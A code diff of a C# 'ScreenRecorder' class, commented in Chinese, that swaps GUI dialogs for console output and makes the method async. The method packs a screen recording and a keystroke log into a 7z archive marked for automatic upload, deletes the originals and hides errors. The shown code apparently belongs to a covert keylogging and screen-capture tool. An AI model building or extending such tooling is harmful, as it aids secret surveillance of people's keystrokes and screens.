@@ -1,9 +1,9 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Windows.Forms;
+using System.Threading.Tasks;
 using SevenZip;
-using System.Drawing;
+
 namespace ScreenRecorder
 {
     /// <summary>
@@ -43,7 +43,7 @@ namespace ScreenRecorder
         }
 
         /// <summary>
-        /// 压缩文件方法（带用户交互）
+        /// 压缩文件方法（控制台模式）
         /// </summary>
         /// <param name="videoFilePath">视频文件路径</param>
         /// <param name="keylogFilePath">键盘记录文件路径</param>
@@ -80,41 +80,14 @@ namespace ScreenRecorder
                 compressor.CompressionMethod = SevenZip.CompressionMethod.Lzma2;
                 compressor.CompressionMode = SevenZip.CompressionMode.Create;
 
-                // 显示压缩进度
-                using (Form progressForm = new Form())
-                {
-                    progressForm.Text = "正在压缩文件...";
-                    progressForm.ClientSize = new Size(300, 100);
-                    progressForm.StartPosition = FormStartPosition.CenterParent;
-                    progressForm.ControlBox = false;
-
-                    ProgressBar progressBar = new ProgressBar();
-                    progressBar.Location = new Point(20, 20);
-                    progressBar.Width = 260;
-                    progressBar.Style = ProgressBarStyle.Marquee;
-
-                    Label label = new Label();
-                    label.Text = "正在准备...";
-                    label.Location = new Point(20, 50);
-                    label.AutoSize = true;
-
-                    progressForm.Controls.Add(progressBar);
-                    progressForm.Controls.Add(label);
-
-                    // 显示进度窗口
-                    progressForm.Show();
-                    Application.DoEvents();
-
-                    // 使用SevenZipSharp压缩文件
-                    compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());
-
-                    progressForm.Close();
-                }
+                // 在控制台模式下不显示进度窗口，直接压缩
+                Console.WriteLine("正在压缩文件...");
+                compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());
 
                 // 检查压缩是否成功
                 if (!File.Exists(zipFilePath))
                 {
-                    MessageBox.Show("压缩失败，未生成压缩文件！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    Console.WriteLine("压缩失败，未生成压缩文件！");
                     return string.Empty;
                 }
 
@@ -131,20 +104,23 @@ namespace ScreenRecorder
                 }
                 catch (Exception ex)
                 {
-                    MessageBox.Show("删除原文件时出错: " + ex.Message, "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    Console.WriteLine("删除原文件时出错: " + ex.Message);
                 }
 
                 // 显示压缩成功信息
                 long compressedSize = new FileInfo(zipFilePath).Length;
                 double compressionRatio = (double)compressedSize / originalSize * 100;
-
-                MessageBox.Show("文件压缩成功！\n\n压缩文件保存在: " + zipFilePath + "\n原始大小: " + (originalSize / 1024.0 / 1024.0).ToString("F2") + " MB\n压缩大小: " + (compressedSize / 1024.0 / 1024.0).ToString("F2") + " MB\n压缩率: " + compressionRatio.ToString("F2") + "%", "压缩成功", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                Console.WriteLine("文件压缩成功！");
+                Console.WriteLine("压缩文件保存在: " + zipFilePath);
+                Console.WriteLine("原始大小: " + (originalSize / 1024.0 / 1024.0).ToString("F2") + " MB");
+                Console.WriteLine("压缩大小: " + (compressedSize / 1024.0 / 1024.0).ToString("F2") + " MB");
+                Console.WriteLine("压缩率: " + compressionRatio.ToString("F2") + "%");
 
                 return zipFilePath;
             }
             catch (Exception ex)
             {
-                MessageBox.Show("压缩文件时出错: " + ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                Console.WriteLine("压缩文件时出错: " + ex.Message);
                 return string.Empty;
             }
         }
@@ -155,61 +131,80 @@ namespace ScreenRecorder
         /// <param name="videoFilePath">视频文件路径</param>
         /// <param name="keylogFilePath">键盘记录文件路径</param>
         /// <returns>压缩文件路径</returns>
-        public string CompressFilesForAutoUpload(string videoFilePath, string? keylogFilePath = null)
+        public async Task<string> CompressFilesForAutoUploadAsync(string videoFilePath, string? keylogFilePath = null)
         {
             try
             {
-                // 创建压缩文件路径
-                string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
-                string? directory = Path.GetDirectoryName(videoFilePath);
-                string zipFilePath = directory != null ? Path.Combine(directory, "AutoUpload_ScreenCapture_" + timestamp + ".7z") : "AutoUpload_ScreenCapture_" + timestamp + ".7z";
-
-                // 准备文件列表
-                List<string> filesToCompress = new() { videoFilePath };
-                if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
+                // 在后台线程中执行压缩操作
+                return await Task.Run(() =>
                 {
-                    filesToCompress.Add(keylogFilePath);
-                }
-
-                // 创建SevenZipCompressor实例并设置最大压缩率
-                SevenZipCompressor compressor = new()
-                {
-                    CompressionLevel = SevenZip.CompressionLevel.Ultra,
-                    CompressionMethod = SevenZip.CompressionMethod.Lzma2,
-                    CompressionMode = SevenZip.CompressionMode.Create
-                };
-
-                // 不显示进度窗口，直接压缩
-                compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());
-
-                // 检查压缩是否成功
-                if (!File.Exists(zipFilePath))
-                {
-                    return string.Empty;
-                }
-
-                // 删除原文件
-                try
-                {
-                    foreach (string fileToDelete in filesToCompress)
+                    try
                     {
-                        if (File.Exists(fileToDelete))
-                        {
-                            File.Delete(fileToDelete);
-                        }
-                    }
-                }
-                catch (Exception)
-                {
-                    // 自动上传过程中的错误不需要显示消息
-                }
+                        // 创建压缩文件路径
+                        string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
+                        string? directory = Path.GetDirectoryName(videoFilePath);
+                        string zipFilePath = directory != null ? Path.Combine(directory, "AutoUpload_ScreenCapture_" + timestamp + ".7z") : "AutoUpload_ScreenCapture_" + timestamp + ".7z";
 
-                return zipFilePath;
+                        // 准备文件列表
+                        List<string> filesToCompress = new() { videoFilePath };
+                        if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
+                        {
+                            filesToCompress.Add(keylogFilePath);
+                        }
+
+                        // 创建SevenZipCompressor实例并设置最大压缩率
+                        SevenZipCompressor compressor = new()
+                        {
+                            CompressionLevel = SevenZip.CompressionLevel.Ultra,
+                            CompressionMethod = SevenZip.CompressionMethod.Lzma2,
+                            CompressionMode = SevenZip.CompressionMode.Create
+                        };
+
+                        // 不显示进度窗口，直接压缩
+                        compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());
+
+                        // 检查压缩是否成功
+                        if (!File.Exists(zipFilePath))
+                        {
+                            return string.Empty;
+                        }
+
+                        // 删除原文件
+                        try
+                        {
+                            foreach (string fileToDelete in filesToCompress)
+                            {
+                                if (File.Exists(fileToDelete))
+                                {
+                                    File.Delete(fileToDelete);
+                                }
+                            }
+                        }
+                        catch (Exception)
+                        {
+                            // 自动上传过程中的错误不需要显示消息
+                        }
+
+                        return zipFilePath;
+                    }
+                    catch (Exception)
+                    {
+                        return string.Empty;
+                    }
+                });
             }
             catch (Exception)
             {
                 return string.Empty;
             }
+        }
+        
+        /// <summary>
+        /// 为了向后兼容保留的同步方法
+        /// </summary>
+        public string CompressFilesForAutoUpload(string videoFilePath, string? keylogFilePath = null)
+        {
+            return CompressFilesForAutoUploadAsync(videoFilePath, keylogFilePath).GetAwaiter().GetResult();
         }
     }
 }
